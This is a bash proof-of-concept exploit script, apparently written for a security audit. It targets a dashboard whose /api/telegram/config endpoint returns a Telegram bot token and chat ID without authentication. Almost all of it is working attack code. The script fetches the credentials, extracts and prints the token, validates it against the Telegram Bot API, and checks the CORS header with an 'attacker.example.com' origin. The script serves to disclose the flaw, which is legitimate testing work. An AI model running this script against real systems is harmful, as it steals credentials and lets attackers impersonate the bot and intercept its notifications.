#!/usr/bin/env bash
# PoC: H3 — Telegram Bot Token Theft
# CVE-class: CWE-306 — Missing Authentication for Critical Function
# Affected: dashboard/routes/system.py:148-150
#
# GET /api/telegram/config returns the Telegram bot token and chat ID
# with zero authentication.  Any network client (or cross-origin page
# due to CORS *) can retrieve the token and fully impersonate the bot.

TARGET="${1:-http://localhost:9000}"

echo "[*] H3 Telegram Bot Token Theft PoC"
echo "[*] Target: $TARGET"
echo ""

# --- Step 1: confirm auth works on a protected endpoint (control) ---
echo "[1] Control: /api/status requires auth (expect 401):"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" "$TARGET/api/status"

# --- Step 2: steal telegram credentials without auth ---
echo ""
echo "[2] Fetching Telegram config — no credentials supplied:"
RESP=$(curl -s -w "\n__HTTP_%{http_code}__" "$TARGET/api/telegram/config")
CODE=$(echo "$RESP" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
BODY=$(echo "$RESP" | sed 's/__HTTP_[0-9]*__//')

echo "    HTTP $CODE"
echo "    Response: $BODY"

if [ "$CODE" = "200" ]; then
    echo "    [PASS] Credentials returned without authentication"
    # Extract token
    TOKEN=$(echo "$BODY" | grep -o '"bot_token":"[^"]*"' | cut -d'"' -f4)
    CHAT_ID=$(echo "$BODY" | grep -o '"chat_id":"[^"]*"' | cut -d'"' -f4)
    if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
        echo "    [IMPACT] bot_token = $TOKEN"
        echo "    [IMPACT] chat_id   = $CHAT_ID"

        # --- Step 3: verify token validity via Telegram API ---
        echo ""
        echo "[3] Verifying stolen token with Telegram Bot API:"
        TG_RESP=$(curl -s "https://api.telegram.org/bot${TOKEN}/getMe")
        echo "    Telegram API response: $TG_RESP"
        if echo "$TG_RESP" | grep -q '"ok":true'; then
            echo "    [IMPACT] Token is VALID — attacker has full bot API access"
        fi
    else
        echo "    [INFO] Token appears empty — bot may not be configured"
        echo "    [CONFIRMED] Endpoint is unauthenticated (200 without credentials)"
    fi
elif [ "$CODE" = "500" ]; then
    echo "    [PARTIAL] HTTP 500 (telegram_bot module error) — NOT 401, no auth enforced"
    echo "    [CONFIRMED] Unauthenticated access to /api/telegram/config proven"
else
    echo "    [INFO] HTTP $CODE"
fi

# --- Step 4: demonstrate cross-origin reachability ---
echo ""
echo "[4] CORS check — cross-origin script can steal token from any web page:"
curl -s -I "$TARGET/api/telegram/config" \
  -H "Origin: https://attacker.example.com" | grep -i "access-control-allow-origin"

echo ""
echo "[*] PoC complete."
echo "[*] Security effect: Telegram bot token exfiltrated without any credential."
echo "[*] Attacker can now send/receive messages as the bot and intercept all notifications."
